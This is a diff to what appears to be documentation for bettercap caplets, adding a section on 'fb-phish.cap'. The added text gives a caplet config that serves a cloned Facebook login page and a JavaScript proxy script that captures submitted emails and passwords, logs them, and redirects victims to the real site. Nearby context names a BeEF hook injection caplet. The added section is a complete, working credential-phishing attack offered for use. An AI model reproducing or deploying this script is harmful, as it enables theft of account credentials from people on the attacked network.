@@ -130,6 +130,54 @@ Clear events:
     <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
 </center>
 
+#### caplets/fb-phish.cap
+
+This caplet will create a fake Facebook login page on port 80, intercept login attempts using the `http.proxy`, print credentials and redirect the target to the real Facebook.
+
+<center>
+    <img src="https://pbs.twimg.com/media/DTY39bnXcAAg5jX.jpg:large" width="100%"/>
+</center>
+
+```sh
+
+set http.server.address 0.0.0.0
+set http.server.path caplets/www/www.facebook.com/
+
+set http.proxy.script caplets/fb-phish.js
+
+http.proxy on
+http.server on
+```
+
+The `caplets/fb-phish.js` proxy script file:
+
+```javascript
+function onRequest(req, res) {
+    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
+        var body = req.ReadBody();
+        var parts = body.split('&');
+        var email = "?", pass = "?";
+
+        for( var i = 0; i < parts.length; i++ ) {
+            var nv = parts[i].split('=');
+            if( nv[0] == "email" ) {
+                email = nv[1];
+            } 
+            else if( nv[0] == "pass" ) {
+                pass = nv[1];
+            }
+        }
+    
+        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );
+
+        res.Status      = 301;
+        res.Headers     = "Location: https://www.facebook.com/\n" +
+                          "Connection: close";
+        res.Updated()
+    }
+}
+```
+
 #### caplets/beef-inject.cap
 
 Use a proxy script to inject a BEEF javascript hook:
